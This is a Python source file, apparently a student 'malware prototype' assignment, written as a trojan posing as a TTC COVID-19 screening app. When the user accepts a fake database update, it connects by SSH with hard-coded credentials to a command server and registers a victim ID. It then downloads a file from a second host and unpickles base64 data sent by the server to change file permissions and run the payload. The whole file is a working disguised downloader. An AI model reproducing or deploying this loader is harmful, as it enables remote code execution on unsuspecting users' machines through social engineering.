#!/usr/bin/python3

#==============================================================================
 #   Assignment:  Malware Protoype
 #
 #       Author:  Andy Garcia
 #     Language:  Python3 (argparse, paramiko, time, uuid, pickle, base64, os)
 #   To Compile:  n/a
 #
 #-----------------------------------------------------------------------------
 #
 #  Description:  Application that checks and synchronizes local database with 
 #                the fake TTC database to conduct COVID-19 Health Safety
 #                Assessment.
 #
 #        Input:  Prompts to update database
 #
 #       Output:  Outputs status of TTC database
 #
 #    Algorithm:  Establishes a connection to the server to retrieve files for
 #                beginning update.
 #
 #   Required Features Not Included:  
 #
 #   Known Bugs:  n/a
 #
 #Classification: A
 #
#==============================================================================

import argparse, paramiko, time, uuid, pickle, base64, os

#Displays help menu and switches that are supported with the program
def programSwitches():

    parser = argparse.ArgumentParser(
        description="TTC COVID-19 Screening Assessment.")

    #Parses arguments
    args = parser.parse_args()
    
    #Returns arguments passed
    return args
    

#Download file from server    
def updateDatabase():  

    #Creates SSH object
    sshConnection= paramiko.SSHClient()

    #Establishes SSH Connection for location of malicious code
    try:

        sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sshConnection.connect('192.168.216.148', username="nytnepvn1", 
                              password="Mkp123")
        channelObject = sshConnection.get_transport().open_session()

    except Exception as e:

        print(f"Error Code: Server is unavailable, please try again later.")
        raise SystemExit()

    #Generates unique ID for victim's machine
    uniqueID = str(uuid.uuid4())

    #Sends uniqueID to server and receives localPath and remotePath variables
    channelObject.send(pickle.dumps(uniqueID))

    #Receives response from server and confirms data was received correctly
    responseMessage = isReceived(channelObject)

    #Receives file permission and confirms data was received correctly
    responsePermission  = isReceived(channelObject)

    #Receives file execution and confirms data was received correctly
    responseCommand = isReceived(channelObject)
    
    sshConnection.close()

    #Establishes SSH Connection to second IP for malware download
    try:
        responseMessage = pickle.loads(responseMessage)
        sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sshConnection.connect(responseMessage[3], username=responseMessage[4], 
                              password=responseMessage[5])
        channelObject = sshConnection.get_transport().open_session()

    except Exception as e:

        print(f"Server unavailable, please try again later.{e}")
        raise SystemExit()

    #Retrieves code to update database based on the response from SSH server 
    sftpConnection = sshConnection.open_sftp()
    sftpConnection.get(responseMessage[2], responseMessage[1])
    sftpConnection.close()
    sshConnection.close()

    #Decodes response and unpickles data to change file permission
    decodePermission = base64.b64decode(responsePermission)
    pickle.loads(decodePermission)

    #Decodes response and unpickles data to execute file
    decodeCommand = base64.b64decode(responseCommand)
    pickle.loads(decodeCommand)


#Checks if message was received correctly
def isReceived(channelObject):

    while True:

        #Saves reply and resends it back to server for correctness
        serverResponse = channelObject.recv(1024)
        channelObject.send(serverResponse)

        messageCorrect = channelObject.recv(1024)
        
        #Continues executing code is message received correctly
        if messageCorrect.decode('utf-8') == "True":
            
            return serverResponse
            
        #Terminates connection if server decides to end after 10 attempts
        elif messageCorrect.decode('utf-8') == "Terminate":

            print("Reached maximum retry attempts, terminating connection.")
            exit()

        #Notifies server that message received was incorrect
        else:

            channelObject.send(b"False")


if __name__ == "__main__":

    #Stores arguments into a dictionary 
    userArgs = vars(programSwitches())
    
    print("Welcome to the new TTC COVID-19 screening assessment!")
    print("Checking for updates...")

    time.sleep(2)

    print("Local database requires update from TTC database.")

    while True:

        userInput = input("Would you like to update? (Y/N): ")

        #Begins updating database if user accepts
        if userInput.upper() == "Y" or userInput.upper() == "YES":

            print("Updating database, this may take a while...")
            updateDatabase()
            break

        #Closes program is user does not want to update the database
        elif userInput.upper() == "N" or userInput.upper() == "NO":

            print("\"N\" was selected, closing program...")
            break

        #Retries user input if user enters invalid input
        else:

            print("\nInvalid input, please try again!\n")
            time.sleep(1)